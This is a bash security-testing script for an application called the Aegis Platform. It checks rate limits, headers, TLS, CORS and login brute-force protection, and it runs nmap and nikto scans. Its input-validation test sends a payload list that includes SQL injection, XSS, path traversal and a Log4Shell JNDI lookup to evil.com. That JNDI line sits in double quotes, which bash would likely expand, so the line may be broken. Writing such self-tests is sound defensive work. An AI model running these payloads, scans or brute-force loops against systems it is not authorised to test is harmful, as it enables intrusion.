#!/bin/bash
# ==============================================
# Aegis Platform - Security Testing Script
# ==============================================
# Comprehensive security testing including:
# - Rate limiting verification
# - Security header validation
# - SSL/TLS configuration testing
# - Penetration testing basics
# - Vulnerability scanning
# ==============================================

set -e

# Configuration
TARGET_HOST="${TARGET_HOST:-localhost}"
TARGET_PORT="${TARGET_PORT:-8000}"
TARGET_HTTPS_PORT="${TARGET_HTTPS_PORT:-443}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"
HTTPS_URL="https://${TARGET_HOST}:${TARGET_HTTPS_PORT}"
TEST_RESULTS_DIR="./test-results"
PARALLEL_REQUESTS="${PARALLEL_REQUESTS:-10}"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_header() {
    echo -e "${BLUE}======================================${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}======================================${NC}"
}

print_success() {
    echo -e "${GREEN}✅ $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}⚠️  $1${NC}"
}

print_error() {
    echo -e "${RED}❌ $1${NC}"
}

print_info() {
    echo -e "${BLUE}ℹ️  $1${NC}"
}

check_requirements() {
    print_header "Checking Security Testing Requirements"
    
    # Check required tools
    local required_tools=("curl" "wget" "openssl" "nmap")
    local optional_tools=("nikto" "sqlmap" "dirb" "gobuster")
    
    for tool in "${required_tools[@]}"; do
        if command -v "$tool" &> /dev/null; then
            print_success "$tool is available"
        else
            print_error "$tool is required but not installed"
            exit 1
        fi
    done
    
    for tool in "${optional_tools[@]}"; do
        if command -v "$tool" &> /dev/null; then
            print_success "$tool is available (optional)"
        else
            print_warning "$tool not available (optional penetration testing tool)"
        fi
    done
    
    # Create results directory
    mkdir -p "$TEST_RESULTS_DIR"
    
    print_success "Requirements check completed"
}

test_basic_connectivity() {
    print_header "Testing Basic Connectivity"
    
    # Test HTTP connectivity
    if curl -s --max-time 10 "$BASE_URL/health" > /dev/null; then
        print_success "HTTP connectivity successful"
    else
        print_error "HTTP connectivity failed"
        return 1
    fi
    
    # Test HTTPS connectivity if configured
    if curl -s --max-time 10 -k "$HTTPS_URL/health" > /dev/null 2>&1; then
        print_success "HTTPS connectivity successful"
    else
        print_warning "HTTPS connectivity failed or not configured"
    fi
    
    # Test API endpoint
    if curl -s --max-time 10 "$BASE_URL/api" > /dev/null; then
        print_success "API endpoint accessible"
    else
        print_error "API endpoint not accessible"
    fi
}

test_rate_limiting() {
    print_header "Testing Rate Limiting"
    
    local test_endpoint="$BASE_URL/api/v1/auth/login"
    local rate_limit_file="$TEST_RESULTS_DIR/rate_limit_test.log"
    
    print_info "Testing rate limiting with $PARALLEL_REQUESTS parallel requests"
    
    # Send multiple requests in parallel
    for i in $(seq 1 $PARALLEL_REQUESTS); do
        (
            response=$(curl -s -o /dev/null -w "%{http_code}" \
                      -X POST "$test_endpoint" \
                      -H "Content-Type: application/json" \
                      -d '{"username":"test","password":"test"}' \
                      --max-time 5)
            echo "Request $i: HTTP $response"
        ) >> "$rate_limit_file" 2>&1 &
    done
    
    wait  # Wait for all background jobs to complete
    
    # Analyze results
    local rate_limited=$(grep "429" "$rate_limit_file" | wc -l)
    local successful=$(grep -E "(200|401|403)" "$rate_limit_file" | wc -l)
    
    echo "Rate limiting test results:"
    echo "  Rate limited (429): $rate_limited"
    echo "  Other responses: $successful"
    
    if [ "$rate_limited" -gt 0 ]; then
        print_success "Rate limiting is working (blocked $rate_limited requests)"
    else
        print_warning "Rate limiting may not be configured or threshold not reached"
    fi
    
    # Test sustained load
    print_info "Testing sustained rate limiting over 2 minutes"
    local sustained_file="$TEST_RESULTS_DIR/sustained_rate_test.log"
    
    for minute in 1 2; do
        echo "Minute $minute - sending 50 requests..."
        for i in $(seq 1 50); do
            curl -s -o /dev/null -w "%{http_code}\n" \
                -X POST "$test_endpoint" \
                -H "Content-Type: application/json" \
                -d '{"username":"test","password":"test"}' \
                --max-time 2 >> "$sustained_file" &
            sleep 1.2  # Slightly over 1 second to test per-minute limits
        done
        wait
    done
    
    local total_rate_limited=$(grep "429" "$sustained_file" | wc -l)
    if [ "$total_rate_limited" -gt 10 ]; then
        print_success "Sustained rate limiting is effective"
    else
        print_warning "Sustained rate limiting may need adjustment"
    fi
}

test_security_headers() {
    print_header "Testing Security Headers"
    
    local headers_file="$TEST_RESULTS_DIR/security_headers.log"
    
    # Test main application
    curl -s -I "$BASE_URL/" > "$headers_file"
    
    # Expected security headers
    local security_headers=(
        "X-Frame-Options"
        "X-Content-Type-Options"
        "X-XSS-Protection"
        "Referrer-Policy"
        "Content-Security-Policy"
        "Strict-Transport-Security"
    )
    
    echo "Security headers analysis:"
    for header in "${security_headers[@]}"; do
        if grep -qi "$header" "$headers_file"; then
            local value=$(grep -i "$header" "$headers_file" | cut -d':' -f2- | tr -d '\r\n' | sed 's/^ *//')
            print_success "$header: $value"
        else
            print_warning "$header: Not present"
        fi
    done
    
    # Check for information disclosure headers
    local disclosure_headers=("Server" "X-Powered-By" "X-AspNet-Version")
    
    echo
    echo "Information disclosure check:"
    for header in "${disclosure_headers[@]}"; do
        if grep -qi "$header" "$headers_file"; then
            local value=$(grep -i "$header" "$headers_file" | cut -d':' -f2- | tr -d '\r\n' | sed 's/^ *//')
            print_warning "$header disclosed: $value"
        else
            print_success "$header: Hidden (good)"
        fi
    done
}

test_ssl_configuration() {
    print_header "Testing SSL/TLS Configuration"
    
    if ! curl -s --max-time 10 -k "$HTTPS_URL/health" > /dev/null 2>&1; then
        print_warning "HTTPS not available - skipping SSL tests"
        return 0
    fi
    
    local ssl_file="$TEST_RESULTS_DIR/ssl_test.log"
    
    # Test SSL certificate
    print_info "Testing SSL certificate..."
    openssl s_client -connect "$TARGET_HOST:$TARGET_HTTPS_PORT" -servername "$TARGET_HOST" \
        < /dev/null > "$ssl_file" 2>&1
    
    # Check certificate validity
    if grep -q "Verify return code: 0 (ok)" "$ssl_file"; then
        print_success "SSL certificate is valid"
    else
        local error=$(grep "Verify return code:" "$ssl_file" | head -1)
        print_warning "SSL certificate issue: $error"
    fi
    
    # Check TLS version
    local tls_version=$(grep "Protocol.*:" "$ssl_file" | head -1 | awk '{print $2}')
    if [[ "$tls_version" == "TLSv1.2" || "$tls_version" == "TLSv1.3" ]]; then
        print_success "Secure TLS version: $tls_version"
    else
        print_error "Insecure TLS version: $tls_version"
    fi
    
    # Check cipher suite
    local cipher=$(grep "Cipher.*:" "$ssl_file" | head -1 | awk '{print $2}')
    if [[ "$cipher" == *"AES"* && "$cipher" == *"GCM"* ]]; then
        print_success "Strong cipher suite: $cipher"
    else
        print_warning "Cipher suite: $cipher (review strength)"
    fi
    
    # Test HSTS header over HTTPS
    local hsts_header=$(curl -s -I "$HTTPS_URL/" | grep -i "strict-transport-security")
    if [ -n "$hsts_header" ]; then
        print_success "HSTS header present: $hsts_header"
    else
        print_warning "HSTS header not found"
    fi
}

test_input_validation() {
    print_header "Testing Input Validation"
    
    local validation_file="$TEST_RESULTS_DIR/input_validation.log"
    local test_payloads=(
        "' OR '1'='1"
        "<script>alert('XSS')</script>"
        "../../../etc/passwd"
        "'; DROP TABLE users; --"
        "${jndi:ldap://evil.com/a}"
        "{{7*7}}"
        "<img src=x onerror=alert(1)>"
    )
    
    local test_endpoints=(
        "/api/v1/users"
        "/api/v1/assets"
        "/api/v1/risks"
    )
    
    echo "Testing common attack payloads:"
    
    for endpoint in "${test_endpoints[@]}"; do
        echo
        print_info "Testing endpoint: $endpoint"
        
        for payload in "${test_payloads[@]}"; do
            # Test as query parameter
            response_code=$(curl -s -o /dev/null -w "%{http_code}" \
                          "$BASE_URL$endpoint?search=$payload" \
                          --max-time 5)
            
            if [ "$response_code" = "400" ] || [ "$response_code" = "403" ]; then
                print_success "Query payload blocked: $payload (HTTP $response_code)"
            elif [ "$response_code" = "500" ]; then
                print_error "Query payload caused error: $payload (HTTP 500)"
            else
                print_warning "Query payload not blocked: $payload (HTTP $response_code)"
            fi
            
            # Test in POST body
            response_code=$(curl -s -o /dev/null -w "%{http_code}" \
                          -X POST "$BASE_URL$endpoint" \
                          -H "Content-Type: application/json" \
                          -d "{\"name\":\"$payload\"}" \
                          --max-time 5)
            
            if [ "$response_code" = "400" ] || [ "$response_code" = "403" ] || [ "$response_code" = "422" ]; then
                print_success "POST payload blocked: $payload (HTTP $response_code)"
            elif [ "$response_code" = "500" ]; then
                print_error "POST payload caused error: $payload (HTTP 500)"
            else
                print_warning "POST payload not blocked: $payload (HTTP $response_code)"
            fi
        done
    done
}

test_authentication_security() {
    print_header "Testing Authentication Security"
    
    local auth_endpoint="$BASE_URL/api/v1/auth/login"
    local auth_file="$TEST_RESULTS_DIR/auth_test.log"
    
    # Test with no credentials
    response=$(curl -s -o /dev/null -w "%{http_code}" \
              -X POST "$auth_endpoint" \
              -H "Content-Type: application/json" \
              -d '{}')
    
    if [ "$response" = "400" ] || [ "$response" = "422" ]; then
        print_success "Empty credentials rejected (HTTP $response)"
    else
        print_warning "Empty credentials response: HTTP $response"
    fi
    
    # Test with invalid credentials
    response=$(curl -s -o /dev/null -w "%{http_code}" \
              -X POST "$auth_endpoint" \
              -H "Content-Type: application/json" \
              -d '{"username":"invalid","password":"invalid"}')
    
    if [ "$response" = "401" ]; then
        print_success "Invalid credentials rejected (HTTP 401)"
    else
        print_warning "Invalid credentials response: HTTP $response"
    fi
    
    # Test password brute force protection
    print_info "Testing brute force protection (20 failed attempts)..."
    for i in $(seq 1 20); do
        curl -s -o /dev/null \
            -X POST "$auth_endpoint" \
            -H "Content-Type: application/json" \
            -d "{\"username\":\"testuser\",\"password\":\"wrong$i\"}" &
    done
    wait
    
    # Test if account gets locked or rate limited
    response=$(curl -s -o /dev/null -w "%{http_code}" \
              -X POST "$auth_endpoint" \
              -H "Content-Type: application/json" \
              -d '{"username":"testuser","password":"wrongpassword"}')
    
    if [ "$response" = "429" ]; then
        print_success "Brute force protection active (HTTP 429)"
    elif [ "$response" = "423" ]; then
        print_success "Account locked after brute force (HTTP 423)"
    else
        print_warning "Brute force protection unclear (HTTP $response)"
    fi
}

test_cors_configuration() {
    print_header "Testing CORS Configuration"
    
    local cors_file="$TEST_RESULTS_DIR/cors_test.log"
    
    # Test CORS preflight
    curl -s -I \
        -H "Origin: https://evil.com" \
        -H "Access-Control-Request-Method: POST" \
        -H "Access-Control-Request-Headers: Content-Type" \
        -X OPTIONS \
        "$BASE_URL/api/v1/users" > "$cors_file"
    
    # Check CORS headers
    local allowed_origin=$(grep -i "access-control-allow-origin" "$cors_file" | cut -d':' -f2- | tr -d '\r\n' | sed 's/^ *//')
    local allowed_methods=$(grep -i "access-control-allow-methods" "$cors_file" | cut -d':' -f2- | tr -d '\r\n' | sed 's/^ *//')
    
    if [ -n "$allowed_origin" ]; then
        if [ "$allowed_origin" = "*" ]; then
            print_error "CORS allows all origins: $allowed_origin"
        else
            print_success "CORS origin restricted: $allowed_origin"
        fi
    else
        print_warning "No CORS origin header found"
    fi
    
    if [ -n "$allowed_methods" ]; then
        print_info "CORS allowed methods: $allowed_methods"
    fi
}

run_basic_port_scan() {
    print_header "Running Basic Port Scan"
    
    if ! command -v nmap &> /dev/null; then
        print_warning "nmap not available - skipping port scan"
        return 0
    fi
    
    local port_scan_file="$TEST_RESULTS_DIR/port_scan.log"
    
    print_info "Scanning common ports on $TARGET_HOST..."
    nmap -sS -O -F "$TARGET_HOST" > "$port_scan_file" 2>&1
    
    # Analyze results
    local open_ports=$(grep "^[0-9]*/tcp.*open" "$port_scan_file" | wc -l)
    local filtered_ports=$(grep "^[0-9]*/tcp.*filtered" "$port_scan_file" | wc -l)
    
    echo "Port scan results:"
    echo "  Open ports: $open_ports"
    echo "  Filtered ports: $filtered_ports"
    
    if [ "$open_ports" -lt 5 ]; then
        print_success "Limited number of open ports (good)"
    else
        print_warning "Many open ports detected - review necessity"
    fi
    
    # Show open ports
    if [ "$open_ports" -gt 0 ]; then
        echo "Open ports:"
        grep "^[0-9]*/tcp.*open" "$port_scan_file" | while read line; do
            echo "  $line"
        done
    fi
}

run_web_vulnerability_scan() {
    print_header "Running Web Vulnerability Scan"
    
    if ! command -v nikto &> /dev/null; then
        print_warning "nikto not available - skipping web vulnerability scan"
        return 0
    fi
    
    local nikto_file="$TEST_RESULTS_DIR/nikto_scan.log"
    
    print_info "Running Nikto web vulnerability scan..."
    nikto -h "$BASE_URL" -output "$nikto_file" -Format txt > /dev/null 2>&1
    
    # Analyze results
    local vulnerabilities=$(grep -c "OSVDB" "$nikto_file" 2>/dev/null || echo 0)
    
    echo "Nikto scan results:"
    echo "  Potential vulnerabilities found: $vulnerabilities"
    
    if [ "$vulnerabilities" -eq 0 ]; then
        print_success "No obvious vulnerabilities detected"
    else
        print_warning "$vulnerabilities potential vulnerabilities found - review $nikto_file"
    fi
}

generate_security_report() {
    print_header "Generating Security Test Report"
    
    local report_file="$TEST_RESULTS_DIR/security_report.html"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Aegis Platform Security Test Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background-color: #2c3e50; color: white; padding: 20px; text-align: center; }
        .section { margin: 20px 0; padding: 15px; border-left: 4px solid #3498db; }
        .success { border-left-color: #27ae60; background-color: #d5f4e6; }
        .warning { border-left-color: #f39c12; background-color: #fef5e7; }
        .error { border-left-color: #e74c3c; background-color: #fadbd8; }
        .info { border-left-color: #3498db; background-color: #ebf3fd; }
        pre { background-color: #f8f9fa; padding: 10px; overflow-x: auto; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Aegis Platform Security Test Report</h1>
        <p>Generated on $(date)</p>
        <p>Target: $BASE_URL</p>
    </div>
    
    <div class="section info">
        <h2>Test Summary</h2>
        <p>Comprehensive security testing performed on the Aegis Platform including:</p>
        <ul>
            <li>Rate limiting verification</li>
            <li>Security headers validation</li>
            <li>SSL/TLS configuration testing</li>
            <li>Input validation testing</li>
            <li>Authentication security testing</li>
            <li>CORS configuration testing</li>
            <li>Basic vulnerability scanning</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>Test Results</h2>
        <p>Detailed test results are available in the following files:</p>
        <ul>
EOF

    # List all test result files
    for file in "$TEST_RESULTS_DIR"/*.log; do
        if [ -f "$file" ]; then
            local filename=$(basename "$file")
            echo "            <li><a href=\"$filename\">$filename</a></li>" >> "$report_file"
        fi
    done
    
    cat >> "$report_file" << EOF
        </ul>
    </div>
    
    <div class="section">
        <h2>Recommendations</h2>
        <ul>
            <li>Review all WARNING messages from the security tests</li>
            <li>Address any ERROR conditions immediately</li>
            <li>Implement additional security measures as needed</li>
            <li>Schedule regular security testing</li>
            <li>Monitor security logs continuously</li>
        </ul>
    </div>
    
    <div class="section info">
        <h2>Next Steps</h2>
        <ol>
            <li>Review detailed test results in log files</li>
            <li>Fix identified security issues</li>
            <li>Re-run tests after fixes</li>
            <li>Implement continuous security monitoring</li>
            <li>Schedule penetration testing by security professionals</li>
        </ol>
    </div>
</body>
</html>
EOF
    
    print_success "Security report generated: $report_file"
}

main() {
    print_header "Aegis Platform Security Testing Suite"
    
    case "${1:-all}" in
        all)
            check_requirements
            test_basic_connectivity
            test_rate_limiting
            test_security_headers
            test_ssl_configuration
            test_input_validation
            test_authentication_security
            test_cors_configuration
            run_basic_port_scan
            run_web_vulnerability_scan
            generate_security_report
            ;;
        connectivity)
            check_requirements
            test_basic_connectivity
            ;;
        rate-limiting)
            check_requirements
            test_rate_limiting
            ;;
        headers)
            check_requirements
            test_security_headers
            ;;
        ssl)
            check_requirements
            test_ssl_configuration
            ;;
        input-validation)
            check_requirements
            test_input_validation
            ;;
        auth)
            check_requirements
            test_authentication_security
            ;;
        cors)
            check_requirements
            test_cors_configuration
            ;;
        scan)
            check_requirements
            run_basic_port_scan
            run_web_vulnerability_scan
            ;;
        report)
            generate_security_report
            ;;
        --help)
            echo "Usage: $0 [test-type]"
            echo ""
            echo "Test types:"
            echo "  all               Run all security tests (default)"
            echo "  connectivity      Test basic connectivity"
            echo "  rate-limiting     Test rate limiting configuration"
            echo "  headers           Test security headers"
            echo "  ssl               Test SSL/TLS configuration"
            echo "  input-validation  Test input validation and filtering"
            echo "  auth              Test authentication security"
            echo "  cors              Test CORS configuration"
            echo "  scan              Run vulnerability scans"
            echo "  report            Generate HTML report"
            echo ""
            echo "Environment variables:"
            echo "  TARGET_HOST       Target hostname (default: localhost)"
            echo "  TARGET_PORT       Target HTTP port (default: 8000)"
            echo "  TARGET_HTTPS_PORT Target HTTPS port (default: 443)"
            echo "  PARALLEL_REQUESTS Number of parallel requests for rate limiting tests (default: 10)"
            exit 0
            ;;
        *)
            print_error "Unknown test type: $1"
            echo "Use --help for usage information"
            exit 1
            ;;
    esac
    
    echo
    print_header "Security Testing Complete"
    print_success "Results saved to: $TEST_RESULTS_DIR"
    
    if [ "$1" = "all" ] || [ -z "$1" ]; then
        echo "📋 View the security report: $TEST_RESULTS_DIR/security_report.html"
        echo "📁 Review detailed logs in: $TEST_RESULTS_DIR/"
    fi
}

main "$@"